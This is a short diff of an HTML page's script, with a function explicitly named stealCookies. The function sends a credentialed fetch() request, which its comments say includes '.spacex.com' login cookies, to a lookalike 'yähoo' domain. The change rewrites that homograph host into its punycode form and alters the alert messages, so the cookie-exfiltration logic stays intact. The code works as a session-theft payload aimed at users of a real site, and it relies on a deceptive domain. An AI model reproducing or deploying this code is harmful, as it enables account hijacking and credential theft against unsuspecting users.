@@ -9,12 +9,13 @@
 
   <script>
     function stealCookies() {
-      fetch('https://proxy.yähoo.com/trace-capture', {
+      fetch('https://proxy.xn--yhoo-loa.com/trace-capture', {
         method: 'GET',
-        credentials: 'include'  // Browser includes `.spacex.com` cookies here
-      }).then(response => response.text())
-        .then(data => alert("Cookies extracted and sent!"))
-        .catch(err => alert("Error: " + err));
+        credentials: 'include'  // Includes .spacex.com cookies if user is logged in
+      })
+      .then(res => res.text())
+      .then(msg => alert("Server says: " + msg))
+      .catch(err => alert("Error: " + err));
     }
   </script>
 </body>
